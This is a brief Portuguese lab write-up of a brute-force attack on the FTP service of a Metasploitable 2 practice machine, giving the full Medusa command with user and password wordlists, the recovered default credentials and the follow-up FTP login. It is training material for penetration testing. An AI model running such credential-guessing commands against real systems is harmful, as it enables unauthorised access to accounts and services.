# Brute Force FTP com Medusa — Metasploitable 2

Documentação de teste de penetração realizado em ambiente controlado contra o serviço FTP do Metasploitable 2.

---

## Ambiente

| Item | Detalhe |
|---|---|
| Alvo | Metasploitable 2 |
| IP do alvo | `192.168.1.4` (rede local) |
| Serviço | FTP (porta 21) |

---

## Wordlists utilizadas

```
/home/leandro/users.txt   # usuários
/home/leandro/pass.txt    # senhas
```

---

## Comando utilizado

```bash
medusa -h 192.168.1.4 -U users.txt -P pass.txt -M ftp -t 6
```

### Flags

| Flag | Descrição |
|---|---|
| `-h` | IP do alvo |
| `-U` | Wordlist de usuários |
| `-P` | Wordlist de senhas |
| `-M` | Módulo do protocolo (ftp) |
| `-t` | Tentativas simultaneas |

---

## Resultado

```
2026-04-08 21:35:01 ACCOUNT FOUND: [ftp] Host: 192.168.1.4 User: msfadmin Password: msfadmin [SUCCESS]
```

O Medusa encontrou credenciais válidas. O Metasploitable 2 possui usuários padrão com senhas fracas intencionalmente, o que o torna ideal para praticar esse tipo de ataque.

---

## Acesso pós-exploração

```bash
ftp 192.168.1.4
# login: msfadmin
# senha: msfadmin
```

---
